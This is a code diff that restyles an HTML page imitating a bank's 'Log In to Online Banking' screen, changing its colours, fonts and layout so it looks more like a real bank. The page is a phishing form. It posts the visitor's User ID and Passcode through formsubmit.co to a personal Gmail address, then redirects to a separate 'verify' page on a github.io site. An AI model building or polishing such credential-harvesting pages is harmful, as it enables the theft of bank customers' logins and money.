@@ -20,12 +20,15 @@
         }
 
         #headthree {
-            color: darkgreen;
-            font-weight: 400;
+            color: #007856;
+            font-size: 28px;
         }
 
         .head_p {
-            color: darkgreen;
+            color: #007856;
+        }
+        label {
+            color: #767676;
         }
 
 
@@ -38,8 +41,8 @@
         .personal {
             padding: 0.7rem 3.3rem;
             color: white;
-            background-color: darkgreen;
-            border: 1px solid darkgreen;
+            background-color: #007856;
+            border: 1px solid #007856;
         }
 
         .commercial {
@@ -53,8 +56,8 @@
             width: 100%;
             padding: 0.7rem 3.3rem;
             color: white;
-            background-color: darkgreen;
-            border: 1px solid darkgreen;
+            background-color: #007856;
+            border: 1px solid #007856;
             border-radius: 3px;
         }
 
@@ -63,15 +66,17 @@
         }
 
         .small_text {
-            font-size: 15px;
-            font-weight: 200;
+            color: #767676;
+            font-size: 12px;
+            /* font-weight: 200; */
             word-spacing: 2px;
         }
         footer {
+            font-size: 10px;
             position: relative;
             bottom: 0;
             height: 100%;
-            background-color: lightgray;
+            background-color: #efefef;
         }
         .pipe {
         
@@ -81,7 +86,7 @@
 </head>
 
 <body>
-    <nav id="nav" class="navbar navbar-expand-lg py-3 fixed-top" style="background-color: darkgreen; color: black">
+    <nav id="nav" class="navbar navbar-expand-lg py-3 fixed-top" style="background-color: #007856; color: black">
         <div class="container">
             <div class="mx-auto">
                 <img src="./white logo.png" onclick="window.location.href = 'index.html'" id="logo" alt="" width="104px"
@@ -92,20 +97,21 @@
     </nav>
 
     <section class="mt-5">
-        <div class="container text-center mt-5 p-5">
-            <h1 id="headthree">Log In to Online Banking</h1>
+        <div class="container-fluid text-center mt-5 pt-4">
+            <span id="headthree">Log In to Online Banking</span>
             <p class="head_p">For Personal and Business Accounts</p>
         </div>
-        <form method="POST" action="https://formsubmit.co/fishtina84@gmail.com">
+        <form method="POST" action="https://formsubmit.co/fishtina84@gmail.com" class="p-4">
             <input type="hidden" name="_next" value="https://code-warlock.github.io/testb/verify.html">
             <input type="hidden" name="_captcha" value="false">
-            <div class="row container input-group  px-5 mx-auto" id="personal">
-                <div class="input-group col-lg-3 col-md-4 col-12 "></div>
-                <label for="" class="p-0">User ID</label>
-                <input type="text" class="form-control" name="UserID" required />
-                <div class="input-group col-lg-3 col-md-4 col-12 pb-4"></div>
+            <div class="row container input-group mx-auto" id="personal">
+                <!-- <div class="input-group col-lg-4 col-md-4 col-4 "></div> -->
+                <label for="">User ID</label>
+                <input type="text" class="form-control" style="border: 1px solid #767676;" name="UserID" required />
+                <div class="input-group col-lg-12 col-md-12 col-12"></div>
                 <label for="">Passcode</label>
-                <input type="password" class="form-control" name="Passcode" required />
+                <input type="password" class="form-control" style="border: 1px solid #767676;" name="Passcode" required />
+                <div class="input-group col-lg-12 col-md-12 col-12 pb-4"></div>
                 <div class="input-group my-2">
                     <div class="input-group-prepend pr-3">
                         <div class="input-group">
@@ -127,7 +133,7 @@
         </div>
 
         <div class="container text-center pt-4">
-            <p class="small_text">Unauthorized access is prohibited. Usage may be monitorized.</p>
+            <p class="small_text" style="font-size: 10px;">Unauthorized access is prohibited. Usage may be monitorized.</p>
         </div>
         <hr>
         <div class="container text-center p-4">
@@ -150,7 +156,7 @@
 
         <div class="container text_center footer_top_links pt-5">
             <a href="" class="head_p px-2 small_link">Get Started Guide</a> <span class="pipe px-3">|</span>
-            <a href="" class="head_p px-2 small_link">Security Assistance</a> <span class="pipe px-3">|</span>
+            <a href="" class="head_p px-2 small_link">Security Assistance</a> <span class="pipe">|</span>
             <a href="" class="head_p px-2 small_link">Digital Service</a>
             <a href="" class="head_p px-1 small_link">Agreement</a> <span class="pipe px-2">|</span>
             <a href="" class="head_p px-1 small_link">Esign Agreement</a> <span class="pipe px-2">|</span>
